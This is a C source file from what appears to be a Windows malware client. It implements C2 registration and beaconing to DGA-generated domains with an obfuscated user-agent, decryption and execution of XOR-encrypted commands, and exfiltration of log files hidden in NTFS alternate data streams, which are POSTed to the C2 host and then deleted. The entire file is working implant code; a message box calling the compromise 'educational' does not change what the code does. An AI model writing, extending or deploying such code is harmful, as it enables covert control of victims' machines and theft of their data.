#include "malware.h"

// Register client with C2 server
void RegisterWithC2() {
    char os[32] = {0};   // OS version buffer
    char arch[32] = {0}; // Architecture buffer
    
    // Get system information
    GetOSInfo(os, sizeof(os));
    GetArchInfo(arch, sizeof(arch));
    
    // Get obfuscated user agent string
    char agent_buf[32];
    char* user_agent = GetObfString(agent_buf, sizeof(agent_buf), OBF_AGENT);
    
    // Generate domain using DGA (Domain Generation Algorithm)
    char generated_domain[64];
    GenerateDomain(generated_domain, sizeof(generated_domain));
    
    // Initialise WinINet handles
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpenA failed: %d\n", GetLastError());
        return;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, generated_domain, 5000, 
                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnectA failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }
    
    // Build registration path
    char path[256];
    sprintf(path, "/register?id=%s&os=%s&arch=%s", CLIENT_ID, os, arch);
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        printf("HttpOpenRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    
    // Send registration request
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        printf("HttpSendRequestA failed: %d\n", GetLastError());
    }
    
    // Cleanup handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Send beacon to C2 server
void BeaconToC2(BOOL is_shutdown) {
    // Get obfuscated strings
    char agent_buf[32];
    char command_buf[16];
    char* user_agent = GetObfString(agent_buf, sizeof(agent_buf), OBF_AGENT);
    
    // Generate domain using DGA
    char generated_domain[64];
    GenerateDomain(generated_domain, sizeof(generated_domain));
    
    // Initialise WinINet
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpenA failed: %d\n", GetLastError());
        return;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, generated_domain, 5000, 
                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnectA failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }
    
    // Build request path
    char* c2_path = GetObfString(command_buf, sizeof(command_buf), OBF_COMMAND);
    char path[256];
    if (is_shutdown) {
        sprintf(path, "/%s?id=%s&shutdown=1", c2_path, CLIENT_ID);
    } else {
        sprintf(path, "/%s?id=%s", c2_path, CLIENT_ID);
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        printf("HttpOpenRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    
    // Send HTTP request
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        printf("HttpSendRequestA failed: %d\n", GetLastError());
    }
    
    // Handle command response (only for normal beacons)
    if (!is_shutdown) {
        char buffer[256];
        DWORD bytesRead;
        if (InternetReadFile(hRequest, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';  // Null-terminate
            
            // Decrypt received command
            char key = XOR_KEY;
            XORCrypt(buffer, bytesRead, &key, TRUE);
            
            printf("Received command: %s\n", buffer);
            HandleCommand(buffer);  // Execute command
        } else {
            printf("No command received\n");
        }
    }
    
    // Cleanup handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Process log file for exfiltration
BOOL ProcessLogFile(LPCSTR filePath) {
    // Open log file
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 
                              FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open log file: %s, error: %d\n", filePath, GetLastError());
        return FALSE;
    }
    
    // Get file size
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        CloseHandle(hFile);
        DeleteFileA(filePath);  // Delete empty file
        return FALSE;
    }
    
    // Allocate memory for file content
    char* data = (char*)malloc(size);
    if (!data) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Read file content
    DWORD bytesRead;
    if (!ReadFile(hFile, data, size, &bytesRead, NULL) || bytesRead != size) {
        free(data);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);
    
    BOOL success = FALSE;
    // Retry exfiltration up to MAX_RETRIES times
    for (int i = 0; i < MAX_RETRIES; i++) {
        // Get obfuscated strings
        char agent_buf[32];
        char upload_buf[16];
        char* user_agent = GetObfString(agent_buf, sizeof(agent_buf), OBF_AGENT);
        
        // Generate domain using DGA
        char generated_domain[64];
        GenerateDomain(generated_domain, sizeof(generated_domain));
        
        // Initialise WinINet
        HINTERNET hInternet = InternetOpenA(user_agent, 
                                          INTERNET_OPEN_TYPE_DIRECT, 
                                          NULL, NULL, 0);
        if (!hInternet) {
            printf("InternetOpenA failed: %d\n", GetLastError());
            continue;
        }
        
        HINTERNET hConnect = InternetConnectA(hInternet, generated_domain, 5000, 
                                            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            printf("InternetConnectA failed: %d\n", GetLastError());
            InternetCloseHandle(hInternet);
            continue;
        }
        
        // Build upload path
        char* upload_path = GetObfString(upload_buf, sizeof(upload_buf), OBF_UPLOAD);
        char path[256];
        sprintf(path, "/%s?id=%s", upload_path, CLIENT_ID);
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, 
                                            NULL, NULL, NULL, 0, 0);
        if (!hRequest) {
            printf("HttpOpenRequestA failed: %d\n", GetLastError());
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            continue;
        }
        
        // Send encrypted data directly
        if (HttpSendRequestA(hRequest, NULL, 0, data, size)) {
            success = TRUE;
            printf("Exfiltration success for %s\n", filePath);
            // Cleanup on success
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            break;
        } else {
            printf("HttpSendRequestA failed: %d\n", GetLastError());
        }
        
        // Cleanup handles before retry
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        Sleep(5000);  // Wait before retry
    }
    
    free(data);  // Release file buffer
    
    if (success) {
        DeleteFileA(filePath);  // Remove after successful exfiltration
        return TRUE;
    } else {
        printf("Failed to exfiltrate file: %s\n", filePath);
        return FALSE;
    }
}

// Exfiltrate collected logs
void ExfiltrateLogs() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);  // Get system temp path
    
    // Construct Alternate Data Stream (ADS) path
    char adsPath[MAX_PATH];
    sprintf(adsPath, "%slegit.txt:%s.log", tempPath, CLIENT_ID);
    
    // Check if ADS log exists and process it
    if (GetFileAttributesA(adsPath) != INVALID_FILE_ATTRIBUTES) {
        printf("Found ADS log: %s\n", adsPath);
        ProcessLogFile(adsPath);
    } else {
        printf("No ADS log found\n");
    }
}

// Handle commands from C2 server
void HandleCommand(const char* cmd) {
    if (!cmd || !*cmd) return;  // Skip empty commands
    
    printf("Executing command: %s\n", cmd);
    
    // Sleep command: slp [seconds]
    if (strncmp(cmd, "slp ", 4) == 0) {
        DWORD sleep_seconds = (DWORD)atoi(cmd + 4);
        sleep_until = GetTickCount() + (1000 * sleep_seconds);
        printf("Sleeping for %d seconds\n", sleep_seconds);
    }
    // Shutdown command
    else if (strcmp(cmd, "shd") == 0) {
        running = FALSE;  // Set termination flag
        printf("Shutdown command received\n");
    }
    // Show message box (proof of compromise)
    else if (strcmp(cmd, "pwn") == 0) {
        printf("Showing message box\n");
        MessageBoxA(NULL, "Your system has been compromised for educational purposes!", 
                   "Security Alert", MB_OK | MB_ICONWARNING);
    }
}